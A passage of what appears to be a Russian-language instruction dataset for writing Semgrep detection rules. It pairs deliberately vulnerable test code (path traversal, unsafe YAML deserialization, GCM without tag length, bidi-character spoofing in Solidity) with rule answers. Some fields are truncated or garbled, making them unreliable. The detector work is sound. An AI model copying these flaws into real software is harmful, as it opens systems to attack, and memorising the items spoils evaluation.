    "output": "rules:\n  - id: avoid-soql-in-loops\n    min-version: 1.44.0\n    severity: ERROR\n    languages:\n      - generic\n    metadata:\n      category: performance\n      references:\n      - https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_gov_limits.htm\n      technology:\n      - salesforce\n    message: >-\n      Database class methods, DML operations, SOQL queries, SOSL queries,\n      Approval class methods, Email sending, async scheduling or queueing\n      within loops can cause governor limit exceptions. Instead, try to\n      batch up the data into a list and invoke the operation once on that\n      list of data outside the loop.\n    patterns:\n      - pattern-either:\n          - pattern-inside: |\n              for (...) {\n                ...\n              }\n          - pattern-inside: |\n              while (...) {\n                ...\n              }\n          - pattern-inside: |\n              do {\n                ...\n              } while (...);\n      - pattern: |\n          $OBJECTS = [...SELECT...FROM...];\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов методов класса Database, операций DML, запросов SOQL и SOSL, а также методов Approval class и отправки email внутри циклов. Такие операции могут привести к превышению лимитов Governor при многократном выполнении в цикле. Правило использует шаблон 'pattern-either' для охвата конструкций цикла 'for', 'while' и 'do-while'. Внутри этих шаблонов ищется конструкция запроса вида '$OBJECTS = [...]SELECT...FROM...', которая является признаком выполнения SOQL-запроса.\n\n# Ключевые элементы:\n- ID: avoid-soql-in-loops\n- Язык: generic \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "avoid-soql-in-loops",
      "language": "generic",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcm-no-tag-length\nОписание уязвимости: The call to 'createDecipheriv' with the Galois Counter Mode (GCM) mode of operation is missing an expected authentication tag length. If the expected authentication tag length is not specified or otherwise checked, the application might be tricked into verifying a shorter-than-expected authentication tag. This can be abused by an attacker to spoof ciphertexts or recover the implicit authentication key of GCM, allowing arbitrary forgeries.\nCWE: CWE-310: CWE CATEGORY: Cryptographic Issues\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-310: CWE CATEGORY: Cryptographic Issues\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: gcm-no-tag-length.js\nconst crypto = require('node:crypto')\nfunction decrypt1(ciphertext, key) {\n    iv = ciphertext.iv\n    encryptedData = ciphertext.data\n    auth = ciphertext.auth\n\n    algo = \"aes-128-gcm\"\n\n    // ruleid: gcm-no-tag-length\n    const decipher = crypto.createDecipheriv(algo, key, iv);\n    decipher.setAuthTag(auth);\n    let result = decipher.update(encryptedData) + decipher.final();\n\n    return result.toString(\"utf8\");\n}\n\nfunction decrypt2(ciphertext, key) {\n    iv = ciphertext.iv\n    encryptedData = ciphertext.data\n    auth = ciphertext.auth\n    // While this prevents the attack, I'm not quite sure how to capture such length checks and exclude them from the findings\n    assert(auth.length === 16)\n\n    // ruleid: gcm-no-tag-length\n    const decipher = crypto.createDecipheriv(\"aes-192-gcm\", key, iv);\n    decipher.setAuthTag(auth);\n    let result = decipher.update(encryptedData) + decipher.final();\n\n    return result.toString(\"utf8\");\n}\n\nfunction decrypt3(ciphertext, key) {\n    iv = ciphertext.iv\n    encryptedData = ciphertext.data\n    auth = ciphertext.auth\n\n    // ok: gcm-no-tag-length\n    var decipher = crypto.createDecipheriv(\"aes-128-gcm\", key, iv, {authTagLength: 16});\n    decipher.setAuthTag(auth);\n    let result = Buffer.concat([decipher.update(encryptedData), decipher.final()]);\n\n    return result;\n}\n\nfunction decrypt4(ciphertext, key) {\n    iv = ciphertext.iv\n    encryptedData = ciphertext.data\n    auth = ciphertext.auth\n\n    // even though auth tag is shorter than it should be, this looks like a conscious choice\n    // ok: gcm-no-tag-length\n    var decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, iv, {authTagLength: 4});\n    decipher.setAuthTag(auth);\n    let result = Buffer.concat([decipher.update(encryptedData), decipher.final()]);\n\n    return result;\n}\n\nfunction decrypt5(ciphertext, key) {\n    iv = ciphertext.iv\n    encryptedData = ciphertext.data\n    auth = ciphertext.auth\n\n    // hard to capture whether options contain 'a  # Ограничиваем длину\n\nОпасные паттерны:\n• const decipher = crypto.createDecipheriv('aes-128-gcm', key, iv);\n• const decipher = crypto.createDecipheriv('aes-192-gcm', key, iv);\n\nБезопасные паттерны:  \n• var decipher = crypto.createDecipheriv('aes-128-gcm', key, iv, {authTagLength: 16});\n• var decipher = crypto.createDecipheriv('chacha20-poly1305', key, iv);\n\nЛегенда аннотаций:\n- // ruleid:gcm-no-tag-length: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcm-no-tag-length: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcm-no-tag-length\n  message: >-\n    The call to 'createDecipheriv' with the Galois Counter Mode (GCM) mode of operation is missing an expected authentication tag length.\n    If the expected authentication tag length is not specified or otherwise checked, the application might be tricked into verifying a shorter-than-expected authentication tag.\n    This can be abused by an attacker to spoof ciphertexts or recover the implicit authentication key of GCM, allowing arbitrary forgeries.\n  metadata:\n    cwe:\n    - 'CWE-310: CWE CATEGORY: Cryptographic Issues'\n    owasp:\n    - A02:2021 - Cryptographic Failures\n    category: security\n    subcategory:\n    - vuln\n    technology:\n    - node-crypto\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    references:\n    - https://www.securesystems.de/blog/forging_ciphertexts_under_Galois_Counter_Mode_for_the_Node_js_crypto_module/\n    - https://nodejs.org/api/crypto.html#cryptocreatedecipherivalgorithm-key-iv-options\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  patterns:\n  - pattern: |\n      $CRYPTO.createDecipheriv('$ALGO', $KEY, $IV)\n  - metavariable-regex:\n      metavariable: $ALGO\n      regex: \".*(-gcm)$\"\n\n\n# Логика правила:\n[\"Тип анализа: поиск (search) выражений, соответствующих созданию объекта 'createDecipheriv' с алгоритмом, содержащим суффикс '-gcm'.\", \"Структура паттерна: используется переменная-мета $CRYPTO для обозначения объекта 'crypto', мета-переменная $ALGO для алгоритма, содержащего суффикс '-gcm', и переменные $KEY, $IV.\", \"Комбинация условий: выражение должно соответствовать вызову функции 'createDecipheriv' с указанным алгоритмом.\"]\n\n# Ключевые элементы:\n- ID: gcm-no-tag-length\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "gcm-no-tag-length",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: use-snakeyaml-constructor\nОписание уязвимости: Used SnakeYAML org.yaml.snakeyaml.Yaml() constructor with no arguments, which is vulnerable to deserialization attacks. Use the one-argument Yaml(...) constructor instead, with SafeConstructor or a custom Constructor as the argument.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-snakeyaml-constructor.java\nimport org.yaml.snakeyaml.Yaml;\nimport org.yaml.snakeyaml.constructor.SafeConstructor;\n\npublic class SnakeYamlTestCase {\n    public void unsafeLoad(String toLoad) {\n        // ruleid:use-snakeyaml-constructor\n        Yaml yaml = new Yaml();\n        yaml.load(toLoad);\n    }\n\n    public void safeConstructorLoad(String toLoad) {\n        // ok:use-snakeyaml-constructor\n        Yaml yaml = new Yaml(new SafeConstructor());\n        yaml.load(toLoad);\n    }\n\n    public void customConstructorLoad(String toLoad, Class goodClass) {\n        // ok:use-snakeyaml-constructor\n        Yaml yaml = new Yaml(new Constructor(goodClass));\n        yaml.load(toLoad);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• Yaml yaml = new Yaml();\nyaml.load(toLoad);\n• Yaml yaml = new Yaml();\nyaml.loadAll(inputStream);\n• Yaml yaml = new Yaml();\nyaml.compose(yamlReader);\n\nБезопасные паттерны:  \n• Yaml yaml = new Yaml(new SafeConstructor());\nyaml.load(toLoad);\n• Yaml yaml = new Yaml(new Constructor(goodClass));\nyaml.load(toLoad);\n• Yaml yaml = new Yaml(new CustomConstructor());\nyaml.load(toLoad);\n\nЛегенда аннотаций:\n- // ruleid:use-snakeyaml-constructor: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-snakeyaml-constructor: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-snakeyaml-constructor\n  languages:\n  - java\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/#snakeyaml-deserialization-vulnerability\n    category: security\n    technology:\n    - snakeyaml\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  message: >-\n    Used SnakeYAML org.yaml.snakeyaml.Yaml() constructor with no arguments, which\n    is vulnerable to deserialization attacks.\n    Use the one-argument Yaml(...) constructor instead, with SafeConstructor or a\n    custom Constructor as the argument.\n  patterns:\n  - pattern: |\n      $Y = new org.yaml.snakeyaml.Yaml();\n      ...\n      $Y.load(...);\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования конструктора Yaml() из библиотеки SnakeYAML без аргументов. Такое использование подвержено атакам десериализации, так как не обеспечивает безопасную обработку загружаемых данных. Правило ищет создание экземпляра класса Yaml без передачи конструктора в качестве аргумента и последующий вызов метода load(). Безопасным является использование конструктора с передачей SafeConstructor или пользовательского конструктора в качестве аргумента.\n\n# Ключевые элементы:\n- ID: use-snakeyaml-constructor\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-snakeyaml-constructor",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: insecure-http-request\nОписание уязвимости: The software transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: apex",
    "input": "Требования:\n- Язык: apex\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: InsecureHttpRequest.cls\n/*\n * A test controller containing http requests.\n * Javadoc insecure endpoint comment test:\n * http://www.website.com\n * Javadoc secure endpoint comment test:\n * https://www.website.com\n */\npublic with sharing class InsecureHttpRequest {\n\n\t// Test comment with insecure endpoint in it\n\t// (comments shouldn't be flagged regardless)\n\t// ok: insecure-http-request\n\t// http://www.website.com\n\tpublic static void insecureRequestMethod() {\n\t\tHttpRequest req = new HttpRequest();\n\t\t// ruleid: insecure-http-request\n\t\treq.setEndpoint('http://www.website.com');\n\t}\n\n\t// Test comment with secure endpoint in it\n\t// (comments shouldn't be flagged regardless)\n\t// ok: insecure-http-request\n\t// https://www.website.com\n\tpublic static void secureRequestMethod() {\n\t\tHttpRequest req = new HttpRequest();\n\t\t// ok: insecure-http-request\n\t\treq.setEndpoint('https://www.website.com');\n\t}\n\n\tpublic static void httpRequestUsingLifeCycleCommunicatorConfigObject() {\n\t\tCommunication_Provider__c insecureCommunicator = new Communication_Provider__c(\n\t\t\tName = MY_COMMUNICATOR,\n\t\t\t// ruleid: insecure-http-request\n\t\t\tDestination__c = 'http://www.website.com',\n\t\t\tBillable__c = true,\n\t\t\tIsActive__c = true,\n\t\t\tClass_Name__c = LifeCycleOAuth2Communicator.class.getName()\n\t\t);\n\n\t\tCommunication_Provider__c secureCommunicator = new Communication_Provider__c(\n\t\t\tName = MY_COMMUNICATOR,\n\t\t\t// ok: insecure-http-request\n\t\t\tDestination__c = 'https://www.website.com',\n\t\t\tBillable__c = true,\n\t\t\tIsActive__c = true,\n\t\t\tClass_Name__c = LifeCycleOAuth2Communicator.class.getName()\n\t\t);\n\t}\n\n\t// ruleid: insecure-http-request\n\tprivate static final String insecureEndpoint = 'http://www.website.com';\n\t// ok: insecure-http-request\n\tprivate static final String secureEndpoint = 'https://www.website.com';\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• req.setEndpoint('http://www.website.com');\n• Communication_Provider__c insecureCommunicator = new Communication_Provider__c(... Destination__c = 'http://www.website.com',...);\n• private static final String insecureEndpoint = 'http://www.website.com';\n\nБезопасные паттерны:  \n• req.setEndpoint('https://www.website.com');\n• Communication_Provider__c secureCommunicator = new Communication_Provider__c(... Destination__c = 'https://www.website.com',...);\n• private static final String secureEndpoint = 'https://www.website.com';\n\nЛегенда аннотаций:\n- // ruleid:insecure-http-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-http-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: insecure-http-request\n    min-version: 1.44.0\n    severity: ERROR\n    languages:\n      - apex\n    metadata:\n      cwe:\n      - 'CWE-319: Cleartext Transmission of Sensitive Information'\n      impact: MEDIUM\n      likelihood: LOW\n      confidence: MEDIUM\n      category: security\n      subcategory:\n      - vuln\n      technology:\n      - salesforce\n      references:\n        - https://cwe.mitre.org/data/definitions/319.html\n    message: >-\n      The software transmits sensitive or security-critical data in cleartext in\n      a communication channel that can be sniffed by unauthorized actors.\n    patterns:\n      - pattern-regex: http[:][/][/]\n      - pattern-not-regex: //.*\n      - pattern-not-regex: '[*].*'\n    paths:\n      exclude:\n        - \"*Test*\"\n        - \"*test*\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска HTTP-запросов, передающих данные в открытом виде, что может быть использовано злоумышленниками для перехвата информации. Анализ выполняется путем поиска строк, содержащих регулярное выражение 'http://', за которыми не следуют другие допустимые URL или строковые литералы. Правило исключает случаи, когда URL начинается с двойных слешей ('//'*) или содержит звездочку внутри строки ('[*].*'), а также тесты и тестовые классы, указанные в исключениях путей.\n\n# Ключевые элементы:\n- ID: insecure-http-request\n- Язык: apex \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "insecure-http-request",
      "language": "apex",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: no-bidi-characters\nОписание уязвимости: The code must not contain any of Unicode Direction Control Characters\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: no-bidi-characters.sol\ncontract GuessTheNumber\n{\n    uint _secretNumber;\n    address payable _owner;\n    event success(string);\n    event wrongNumber(string);\n\n    constructor(uint secretNumber) payable public\n    {\n        require(secretNumber <= 10);\n        _secretNumber = secretNumber;\n        _owner = msg.sender;    \n    }\n\n    function getValue() view public returns (uint)\n    {\n        return address(this).balance;\n    }\n\n    function guess(uint n) payable public\n    {\n        require(msg.value == 1 ether);\n\n        uint p = address(this).balance;\n        // ruleid: no-bidi-characters\n        checkAndTransferPrize(/*The prize‮/*rebmun desseug*/n , p/*‭\n                /*The user who should benefit */,msg.sender);\n    }\n\n// ruleid: no-bidi-characters\n// ‪             # left-to-right embedding (LRE)\n// ruleid: no-bidi-characters\n// ‫             # right-to-left embedding (RLE)\n// ruleid: no-bidi-characters\n// ‭             # left-to-right override (LRO)\n// ruleid: no-bidi-characters\n// ‮             # right-to-left override (RLO)\n// ruleid: no-bidi-characters\n//⁦             # left-to-right isolate (LRI)\n// ruleid: no-bidi-characters\n//⁧             # right-to-left isolate (RLI)\n// ruleid: no-bidi-characters\n//⁨             # first strong isolate (FSI)\n// ruleid: no-bidi-characters\n// ‬             # pop directional formatting (PDF)\n// ruleid: no-bidi-characters\n//⁩             # pop directional isolate (PDI)\n\n    function checkAndTransferPrize(uint p, uint n, address payable guesser) internal returns(bool)\n    {\n        if(n == _secretNumber)\n        {\n            guesser.transfer(p);\n            emit success(\"You guessed the correct number!\");\n        }\n        else\n        {\n            emit wrongNumber(\"You've made an incorrect guess!\");\n        }\n    }\n\n    function kill() public\n    {\n        require(msg.sender == _owner);\n        selfdestruct(_owner);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: no-bidi-characters\ncheckAndTransferPrize(/*The prize‮/*rebmun desseug*/n , p/*‭\n                /*The user who should benefit */,msg.sender);\n• // ruleid: no-bidi-characters\n‪             # left-to-right embedding (LRE)\n• // ruleid: no-bidi-characters\n‫             # right-to-left embedding (RLE)\n\nБезопасные паттерны:  \n• function guess(uint n) payable public\n{\n    require(msg.value == 1 ether);\n\n    uint p = address(this).balance;\n    checkAndTransferPrize(n, p, msg.sender);\n}\n• function checkAndTransferPrize(uint p, uint n, address payable guesser) internal returns(bool)\n{\n    if(n == _secretNumber)\n    {\n        guesser.transfer(p);\n        emit success(\"You guessed the cor\n• function kill() public\n{\n    require(msg.sender == _owner);\n    selfdestruct(_owner);\n}\n\nЛегенда аннотаций:\n- // ruleid:no-bidi-characters: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:no-bidi-characters: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: no-bidi-characters\n    message: The code must not contain any of Unicode Direction Control Characters\n    metadata:\n      category: security\n      technology:\n        - solidity\n      cwe: \"CWE-837: Improper Enforcement of a Single, Unique Action\"\n      confidence: HIGH\n      likelihood: LOW\n      impact: LOW\n      subcategory:\n          - audit\n      references:\n        - https://entethalliance.org/specs/ethtrust-sl/v1/#req-1-unicode-bdo\n    patterns:\n    - pattern-either:\n      - pattern-regex: ‪             # left-to-right embedding (LRE)\n      - pattern-regex: ‫             # right-to-left embedding (RLE)\n      - pattern-regex: ‭             # left-to-right override (LRO)\n      - pattern-regex: ‮             # right-to-left override (RLO)\n      - pattern-regex: ⁦             # left-to-right isolate (LRI)\n      - pattern-regex: ⁧             # right-to-left isolate (RLI)\n      - pattern-regex: ⁨             # first strong isolate (FSI)\n      - pattern-regex: ‬             # pop directional formatting (PDF)\n      - pattern-regex: ⁩             # pop directional isolate (PDI)\n    languages: \n      - solidity\n    severity: WARNING\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования управляющих символов направления Unicode в Solidity-коде. Управляющие символы направления используются для изменения порядка отображения текста и могут быть использованы злоумышленниками для обхода проверок ввода или манипулирования данными. Паттерн использует оператор 'pattern-either' для объединения нескольких регулярных выражений, соответствующих различным типам управляющих символов направления. Эти регулярные выражения соответствуют символам, таким как лево-направляющий встраивающий (LRE), право-направляющий встраивающий (RLE), лево-направляющий переопределяющий (LRO), право-направляющий переопределяющий (RLO), изолирующий левый (LRI), изолирующий правый (RLI), первый сильный изолятор (FSI), форматирование удаления направления (PDF) и удаление изолятора направления (PDI). Правило применимо только к Solidity-коду.\n\n# Ключевые элементы:\n- ID: no-bidi-characters\n- Язык: solidity \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "no-bidi-characters",
      "language": "solidity",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: azure-scale-set-password\nОписание уязвимости: Ensure that Virtual machine does not enable password authentication\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-scale-set-password.tf\n# fail\n# ruleid: azure-scale-set-password\nresource \"azurerm_linux_virtual_machine_scale_set\" \"example\" {\n    name                = var.scaleset_name\n    resource_group_name = var.resource_group.name\n    location            = var.resource_group.location\n    sku                 = var.sku\n    instances           = var.instance_count\n    admin_username      = var.admin_username\n    disable_password_authentication = false\n    tags = var.common_tags\n}\n\n# pass\nresource \"azurerm_linux_virtual_machine_scale_set\" \"example\" {\n    name                = var.scaleset_name\n    resource_group_name = var.resource_group.name\n    location            = var.resource_group.location\n    sku                 = var.sku\n    instances           = var.instance_count\n    admin_username      = var.admin_username\n    disable_password_authentication = true\n\n    admin_ssh_key {\n        username   = var.admin_username\n        public_key = tls_private_key.new.public_key_pem\n    }\n    tags = var.common_tags\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_linux_virtual_machine_scale_set\" \"example\" { ... disable_password_authentication = false ... }\n• resource \"azurerm_linux_virtual_machine_scale_set\" \"example\" { ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_linux_virtual_machine_scale_set\" \"example\" { ... disable_password_authentication = true ... }\n• resource \"azurerm_linux_virtual_machine_scale_set\" \"example\" { ... admin_ssh_key { ... } ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-scale-set-password: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-scale-set-password: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-scale-set-password\n  message: >-\n    Ensure that Virtual machine does not enable password authentication\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"azurerm_linux_virtual_machine_scale_set\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"azurerm_linux_virtual_machine_scale_set\" \"...\" {\n      ...\n      disable_password_authentication = true\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure Linux виртуальных машин масштабирования набора, где включена аутентификация паролем. Анализ выполняется путем поиска шаблона ресурса Azure Resource Manager (ARM) типа 'azurerm_linux_virtual_machine_scale_set'. Затем проверяется наличие параметра 'disable_password_authentication' внутри этого ресурса. Если параметр отсутствует или установлен в значение 'false', то это считается опасным примером, так как позволяет использовать парольную аутентификацию. Безопасный пример включает явное указание 'disable_password_authentication = true', что запрещает использование парольной аутентификации.\n\n# Ключевые элементы:\n- ID: azure-scale-set-password\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-scale-set-password",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: path-traversal-open\nОписание уязвимости: Found request data in a call to 'open'. Ensure the request data is validated or sanitized, otherwise it could result in path traversal attacks.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: path-traversal-open.py\nimport flask\nimport json\n\napp = flask.Flask(__name__)\n\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n    print(\"blah\")\n    # ruleid: path-traversal-open\n    return open(route_param, 'r').read()\n\n@app.route(\"/route_param_ok/<route_param>\")\ndef route_param_ok(route_param):\n    print(\"blah\")\n    # ok: path-traversal-open\n    return open(\"this is safe\", 'r').read()\n\n@app.route(\"/route_param_with/<route_param>\")\ndef route_param_with(route_param):\n    print(\"blah\")\n    # ruleid: path-traversal-open\n    with open(route_param, 'r') as fout:\n        return fout.read()\n\n@app.route(\"/route_param_with_ok/<route_param>\")\ndef route_param_with_ok(route_param):\n    print(\"blah\")\n    # ok: path-traversal-open\n    with open(\"this is safe\", 'r') as fout:\n        return fout.read()\n\n@app.route(\"/route_param_with_concat/<route_param>\")\ndef route_param_with_concat(route_param):\n    print(\"blah\")\n    # ruleid: path-traversal-open\n    with open(route_param + \".csv\", 'r') as fout:\n        return fout.read()\n\n@app.route(\"/get_param\", methods=[\"GET\"])\ndef get_param():\n    param = flask.request.args.get(\"param\")\n    # ruleid: path-traversal-open\n    f = open(param, 'w')\n    f.write(\"hello world\")\n\n@app.route(\"/get_param_inline_concat\", methods=[\"GET\"])\ndef get_param_inline_concat():\n    # ruleid: path-traversal-open\n    return open(\"echo \" + flask.request.args.get(\"param\"), 'r').read()\n\n@app.route(\"/get_param_concat\", methods=[\"GET\"])\ndef get_param_concat():\n    param = flask.request.args.get(\"param\")\n    # ruleid: path-traversal-open\n    return open(param + \".csv\", 'r').read()\n\n@app.route(\"/get_param_format\", methods=[\"GET\"])\ndef get_param_format():\n    param = flask.request.args.get(\"param\")\n    # ruleid: path-traversal-open\n    return open(\"{}.csv\".format(param)).read()\n\n@app.route(\"/get_param_percent_format\", methods=[\"GET\"])\ndef get_param_percent_format():\n    param = flask.request.args.get(\"param\")\n    # ruleid: path-traversal-open  # Ограничиваем длину\n\nОпасные паттерны:\n• return open(route_param, 'r').read()\n• with open(route_param + \\\n• , 'r') as fout: return fout.read()\n\nБезопасные паттерны:  \n• return open(\\\n• , 'r').read()\n• with open(\\\n\nЛегенда аннотаций:\n- // ruleid:path-traversal-open: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:path-traversal-open: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: path-traversal-open\n  languages:\n  - python\n  severity: ERROR\n  message: >-\n    Found request data in a call to 'open'. Ensure the request data is validated or sanitized, otherwise\n    it could result\n    in path traversal attacks.\n  metadata:\n    cwe:\n    - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    references:\n    - https://owasp.org/www-community/attacks/Path_Traversal\n    category: security\n    technology:\n    - flask\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n  pattern-either:\n  - patterns:\n    - pattern: open(...)\n    - pattern-either:\n      - pattern-inside: |\n          @$APP.route($ROUTE, ...)\n          def $FUNC(..., $ROUTEVAR, ...):\n            ...\n            open(..., <... $ROUTEVAR ...>, ...)\n      - pattern-inside: |\n          @$APP.route($ROUTE, ...)\n          def $FUNC(..., $ROUTEVAR, ...):\n            ...\n            with open(..., <... $ROUTEVAR ...>, ...) as $FD:\n              ...\n      - pattern-inside: |\n          @$APP.route($ROUTE, ...)\n          def $FUNC(..., $ROUTEVAR, ...):\n            ...\n            $INTERM = <... $ROUTEVAR ...>\n            ...\n            open(..., <... $INTERM ...>, ...)\n  - pattern: open(..., <... flask.request.$W.get(...) ...>, ...)\n  - pattern: open(..., <... flask.request.$W[...] ...>, ...)\n  - pattern: open(..., <... flask.request.$W(...) ...>, ...)\n  - pattern: open(..., <... flask.request.$W ...>, ...)\n  - patterns:\n    - pattern-inside: |\n        $INTERM = <... flask.request.$W.get(...) ...>\n        ...\n        open(<... $INTERM ...>, ...)\n    - pattern: open(...)\n  - patterns:\n    - pattern-inside: |\n        $INTERM = <... flask.request.$W[...] ...>\n        ...\n        open(<... $INTERM ...>, ...)\n    - pattern: open(...)\n  - patterns:\n    - pattern-inside: |\n        $INTERM = <... flask.request.$W(...) ...>\n        ...\n        open(<... $INTERM ...>, ...)\n    - pattern: open(...)\n  - patterns:\n    - pattern-inside: |\n        $INTERM = <... flask.request.$W ...>\n        ...\n        open(<... $INTERM ...>, ...)\n    - pattern: open(...)\n  - patterns:\n    - pattern-inside: |\n        $INTERM = <... flask.request.$W.get(...) ...>\n        ...\n        with open(<... $INTERM ...>, ...) as $F:\n          ...\n    - pattern: open(...)\n  - patterns:\n    - pattern-inside: |\n        $INTERM = <... flask.request.$W[...] ...>\n        ...\n        with open(<... $INTERM ...>, ...) as $F:\n          ...\n    - pattern: open(...)\n  - patterns:\n    - pattern-inside: |\n        $INTERM = <... flask.request.$W(...) ...>\n        ...\n        with open(<... $INTERM ...>, ...) as $F:\n          ...\n    - pattern: open(...)\n  - patterns:\n    - pattern-inside: |\n        $INTERM = <... flask.request.$W ...>\n        ...\n        with open(<... $INTERM ...>, ...) as $F:\n          ...\n    - pattern: open(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции 'open' в Python с передачей потенциально небезопасных пользовательских данных. Паттерны включают прямое использование переменных, полученных от 'flask.request', а также промежуточные выражения, которые могут быть использованы для создания путей файлов. Правило ищет случаи, когда путь файла формируется динамически на основе входных данных пользователя и передается в функцию 'open', что может привести к атакам типа path traversal.\n\n# Ключевые элементы:\n- ID: path-traversal-open\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "path-traversal-open",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: aws-timestream-database-encrypted-with-cmk\nОписание уязвимости: Ensure Timestream database is encrypted at rest using KMS CMKs. CMKs gives you control over the encryption key in terms of access and rotation.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
